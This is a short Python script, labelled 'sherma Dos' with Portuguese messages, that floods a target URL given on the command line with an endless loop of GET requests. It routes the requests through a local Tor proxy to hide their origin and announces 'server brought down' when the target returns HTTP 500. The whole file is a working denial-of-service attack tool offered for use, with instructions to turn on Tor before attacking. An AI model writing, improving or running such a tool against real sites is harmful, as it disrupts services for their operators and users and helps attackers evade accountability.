import requests
import sys
from pyfiglet import figlet_format

print(figlet_format("sherma Dos"))
print("Ative o Tor antes de iniciar o ataque")


try:
    url = sys.argv[1]
    arg2 = sys.argv[2]
except IndexError:
    sys.exit(1)

proxies = {
    "http": "socks5h://127.0.0.1:9050",
    "https": "socks5h://127.0.0.1:9050"
}

session = requests.Session()

while True:
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
        "Connection": "close"
    }

    try:
        response = session.get(url, headers=headers, proxies=proxies)

        if response.status_code == 500:
            print("[*] Servidor derrubado")

        if arg2 == "-v":
            print(f"[*] Requisição feita status: {response.status_code}")

    except Exception as e:
        print("[*] Erro: provavelmente o endereço IP queimou (reinicie o Tor)")
        print("Erro:", e) 